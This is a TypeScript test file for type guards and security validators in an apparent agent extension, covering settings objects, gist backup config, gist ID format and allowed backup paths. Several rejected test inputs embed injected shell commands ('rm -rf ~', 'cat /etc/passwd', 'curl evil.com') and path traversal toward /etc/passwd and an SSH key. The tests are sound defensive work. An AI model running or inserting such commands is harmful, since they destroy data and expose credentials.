/**
 * Type Guard Tests - Comprehensive Coverage
 *
 * Tests all runtime type validation functions.
 * Each type guard is tested with:
 * - Valid inputs (success paths)
 * - Invalid types (failure paths)
 * - Edge cases (null, undefined, empty arrays, wrong property types)
 */

import assert from "node:assert";
import { describe, it } from "node:test";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";

// =============================================================================
// Type Guard Implementations (mirroring extensions/index.ts)
// =============================================================================

interface PiSettings {
	packages?: string[];
	extensions?: string[];
}

interface GuardConfig {
	backupPath?: string;
	gistId?: string;
	gistEnabled?: boolean;
}

function isPiSettings(value: unknown): value is PiSettings {
	if (typeof value !== "object" || value === null) return false;
	if (Array.isArray(value)) return false;
	const candidate = value as Record<string, unknown>;

	if (candidate.packages !== undefined) {
		if (!Array.isArray(candidate.packages)) return false;
		if (!candidate.packages.every((p) => typeof p === "string")) return false;
	}

	if (candidate.extensions !== undefined) {
		if (!Array.isArray(candidate.extensions)) return false;
		if (!candidate.extensions.every((e) => typeof e === "string")) return false;
	}

	return true;
}

function isGuardConfig(value: unknown): value is GuardConfig {
	if (typeof value !== "object" || value === null) return false;
	if (Array.isArray(value)) return false;
	const candidate = value as Record<string, unknown>;

	if (
		candidate.backupPath !== undefined &&
		typeof candidate.backupPath !== "string"
	) {
		return false;
	}
	if (candidate.gistId !== undefined && typeof candidate.gistId !== "string") {
		return false;
	}
	if (
		candidate.gistEnabled !== undefined &&
		typeof candidate.gistEnabled !== "boolean"
	) {
		return false;
	}

	return true;
}

function isBashToolInput(input: unknown): input is { command?: string } {
	if (typeof input !== "object" || input === null) return false;
	if (Array.isArray(input)) return false;
	return true;
}

function extractGistId(input: string): string {
	const trimmed = input.trim();
	const match = trimmed.match(/gist\.github\.com\/(?:.*\/)?([a-f0-9]+)/);
	return match ? match[1] : trimmed;
}

function isValidGistId(gistId: string): boolean {
	return /^[a-f0-9]+$/i.test(gistId);
}

function isValidBackupPath(backupPath: string): boolean {
	const resolvedPath = join(backupPath);
	const homeDir = homedir();
	const allowedDirs = [join(homeDir, ".pi", "agent"), tmpdir()];

	return allowedDirs.some(
		(allowedDir) =>
			resolvedPath === allowedDir || resolvedPath.startsWith(`${allowedDir}/`),
	);
}

// =============================================================================
// Test Suites
// =============================================================================

describe("isPiSettings", () => {
	describe("valid inputs (should return true)", () => {
		it("accepts empty object", () => {
			assert.strictEqual(isPiSettings({}), true);
		});

		it("accepts object with packages array", () => {
			assert.strictEqual(
				isPiSettings({ packages: ["pi-foo", "pi-bar"] }),
				true,
			);
		});

		it("accepts object with extensions array", () => {
			assert.strictEqual(
				isPiSettings({ extensions: ["pi-ext1", "pi-ext2"] }),
				true,
			);
		});

		it("accepts object with both packages and extensions", () => {
			assert.strictEqual(
				isPiSettings({
					packages: ["pi-foo"],
					extensions: ["pi-ext"],
				}),
				true,
			);
		});

		it("accepts empty arrays", () => {
			assert.strictEqual(isPiSettings({ packages: [], extensions: [] }), true);
		});
	});

	describe("invalid types (should return false)", () => {
		it("rejects null", () => {
			assert.strictEqual(isPiSettings(null), false);
		});

		it("rejects undefined", () => {
			assert.strictEqual(isPiSettings(undefined), false);
		});

		it("rejects array", () => {
			assert.strictEqual(isPiSettings([]), false);
		});

		it("rejects string", () => {
			assert.strictEqual(isPiSettings("not an object"), false);
		});

		it("rejects number", () => {
			assert.strictEqual(isPiSettings(42), false);
		});

		it("rejects boolean", () => {
			assert.strictEqual(isPiSettings(true), false);
		});
	});

	describe("edge cases (should return false)", () => {
		it("rejects packages as non-array", () => {
			assert.strictEqual(isPiSettings({ packages: "pi-foo" }), false);
		});

		it("rejects packages with non-string elements", () => {
			assert.strictEqual(isPiSettings({ packages: ["pi-foo", 123] }), false);
		});

		it("rejects extensions as non-array", () => {
			assert.strictEqual(isPiSettings({ extensions: "pi-ext" }), false);
		});

		it("rejects extensions with non-string elements", () => {
			assert.strictEqual(isPiSettings({ extensions: ["pi-ext", null] }), false);
		});

		it("rejects packages containing undefined values", () => {
			assert.strictEqual(
				isPiSettings({ packages: ["pi-foo", undefined] }),
				false,
			);
		});

		it("rejects packages containing objects", () => {
			assert.strictEqual(
				isPiSettings({ packages: [{ name: "pi-foo" }] }),
				false,
			);
		});
	});
});

describe("isGuardConfig", () => {
	describe("valid inputs (should return true)", () => {
		it("accepts empty object", () => {
			assert.strictEqual(isGuardConfig({}), true);
		});

		it("accepts object with backupPath", () => {
			assert.strictEqual(
				isGuardConfig({ backupPath: "/home/user/.pi/agent/backup.json" }),
				true,
			);
		});

		it("accepts object with gistId", () => {
			assert.strictEqual(isGuardConfig({ gistId: "abc123def456" }), true);
		});

		it("accepts object with gistEnabled", () => {
			assert.strictEqual(isGuardConfig({ gistEnabled: true }), true);
		});

		it("accepts object with gistEnabled false", () => {
			assert.strictEqual(isGuardConfig({ gistEnabled: false }), true);
		});

		it("accepts object with all properties", () => {
			assert.strictEqual(
				isGuardConfig({
					backupPath: "/home/user/.pi/agent/backup.json",
					gistId: "abc123def456",
					gistEnabled: true,
				}),
				true,
			);
		});
	});

	describe("invalid types (should return false)", () => {
		it("rejects null", () => {
			assert.strictEqual(isGuardConfig(null), false);
		});

		it("rejects undefined", () => {
			assert.strictEqual(isGuardConfig(undefined), false);
		});

		it("rejects array", () => {
			assert.strictEqual(isGuardConfig([]), false);
		});

		it("rejects string", () => {
			assert.strictEqual(isGuardConfig("config"), false);
		});

		it("rejects number", () => {
			assert.strictEqual(isGuardConfig(42), false);
		});
	});

	describe("edge cases (should return false)", () => {
		it("rejects backupPath as number", () => {
			assert.strictEqual(isGuardConfig({ backupPath: 123 }), false);
		});

		it("rejects backupPath as null", () => {
			assert.strictEqual(isGuardConfig({ backupPath: null }), false);
		});

		it("rejects gistId as number", () => {
			assert.strictEqual(isGuardConfig({ gistId: 123456 }), false);
		});

		it("rejects gistId as null", () => {
			assert.strictEqual(isGuardConfig({ gistId: null }), false);
		});

		it("rejects gistEnabled as string", () => {
			assert.strictEqual(isGuardConfig({ gistEnabled: "true" }), false);
		});

		it("rejects gistEnabled as number", () => {
			assert.strictEqual(isGuardConfig({ gistEnabled: 1 }), false);
		});

		it("rejects gistEnabled as null", () => {
			assert.strictEqual(isGuardConfig({ gistEnabled: null }), false);
		});

		it("accepts empty string gistId", () => {
			// Empty string is still a valid string type
			assert.strictEqual(isGuardConfig({ gistId: "" }), true);
		});
	});
});

describe("isBashToolInput", () => {
	describe("valid inputs (should return true)", () => {
		it("accepts empty object", () => {
			assert.strictEqual(isBashToolInput({}), true);
		});

		it("accepts object with command string", () => {
			assert.strictEqual(isBashToolInput({ command: "npm install" }), true);
		});

		it("accepts object with command undefined", () => {
			assert.strictEqual(isBashToolInput({ command: undefined }), true);
		});

		it("accepts object with additional properties", () => {
			assert.strictEqual(
				isBashToolInput({ command: "npm install", timeout: 5000 }),
				true,
			);
		});
	});

	describe("invalid types (should return false)", () => {
		it("rejects null", () => {
			assert.strictEqual(isBashToolInput(null), false);
		});

		it("rejects undefined", () => {
			assert.strictEqual(isBashToolInput(undefined), false);
		});

		it("rejects array", () => {
			assert.strictEqual(isBashToolInput([]), false);
		});

		it("rejects string", () => {
			assert.strictEqual(isBashToolInput("npm install"), false);
		});

		it("rejects number", () => {
			assert.strictEqual(isBashToolInput(42), false);
		});

		it("rejects boolean", () => {
			assert.strictEqual(isBashToolInput(true), false);
		});

		it("rejects function", () => {
			assert.strictEqual(
				isBashToolInput(() => {}),
				false,
			);
		});
	});
});

describe("isValidGistId (security validation)", () => {
	describe("valid inputs (should return true)", () => {
		it("accepts lowercase hex string", () => {
			assert.strictEqual(isValidGistId("abc123def456"), true);
		});

		it("accepts uppercase hex string", () => {
			assert.strictEqual(isValidGistId("ABC123DEF456"), true);
		});

		it("accepts mixed case hex string", () => {
			assert.strictEqual(isValidGistId("AbC123dEf456"), true);
		});

		it("accepts numeric-only string", () => {
			assert.strictEqual(isValidGistId("1234567890"), true);
		});

		it("accepts alpha-only string", () => {
			assert.strictEqual(isValidGistId("abcdef"), true);
		});
	});

	describe("invalid inputs (should return false)", () => {
		it("rejects command injection with semicolon", () => {
			assert.strictEqual(isValidGistId("abc123; rm -rf ~"), false);
		});

		it("rejects command injection with &&", () => {
			assert.strictEqual(isValidGistId("abc123 && cat /etc/passwd"), false);
		});

		it("rejects command injection with |", () => {
			assert.strictEqual(isValidGistId("abc123 | curl evil.com"), false);
		});

		it("rejects path traversal characters", () => {
			assert.strictEqual(isValidGistId("../etc/passwd"), false);
		});

		it("rejects special characters", () => {
			assert.strictEqual(isValidGistId("abc@123"), false);
		});

		it("rejects spaces", () => {
			assert.strictEqual(isValidGistId("abc 123"), false);
		});

		it("rejects empty string", () => {
			assert.strictEqual(isValidGistId(""), false);
		});
	});
});

describe("extractGistId", () => {
	describe("valid URL extraction", () => {
		it("extracts ID from full URL with username", () => {
			assert.strictEqual(
				extractGistId("https://gist.github.com/username/abc123def456"),
				"abc123def456",
			);
		});

		it("extracts ID from URL without username", () => {
			assert.strictEqual(
				extractGistId("https://gist.github.com/abc123def456"),
				"abc123def456",
			);
		});

		it("passes through raw gist ID", () => {
			assert.strictEqual(extractGistId("abc123def456"), "abc123def456");
		});

		it("trims whitespace", () => {
			assert.strictEqual(
				extractGistId("  https://gist.github.com/user/abc123  "),
				"abc123",
			);
		});
	});
});

describe("isValidBackupPath (security validation)", () => {
	describe("valid paths (should return true)", () => {
		it("accepts path within .pi/agent directory", () => {
			const path = `${process.env.HOME || "/home/user"}/.pi/agent/backup.json`;
			assert.strictEqual(isValidBackupPath(path), true);
		});

		it("accepts path in tmpdir", () => {
			// Use actual tmpdir() path since macOS uses /var/folders/... not /tmp
			assert.strictEqual(isValidBackupPath(`${tmpdir()}/backup.json`), true);
		});

		it("accepts nested path within .pi/agent", () => {
			const path = `${process.env.HOME || "/home/user"}/.pi/agent/backups/daily/backup.json`;
			assert.strictEqual(isValidBackupPath(path), true);
		});
	});

	describe("invalid paths (should return false)", () => {
		it("rejects path outside allowed directories", () => {
			assert.strictEqual(isValidBackupPath("/etc/passwd"), false);
		});

		it("rejects path with traversal to parent", () => {
			const path = `${process.env.HOME || "/home/user"}/.pi/agent/../../../etc/passwd`;
			assert.strictEqual(isValidBackupPath(path), false);
		});

		it("rejects absolute path to home", () => {
			assert.strictEqual(isValidBackupPath("/home/user/.ssh/id_rsa"), false);
		});

		it("rejects system directory paths", () => {
			assert.strictEqual(isValidBackupPath("/var/log/system.log"), false);
		});
	});
});
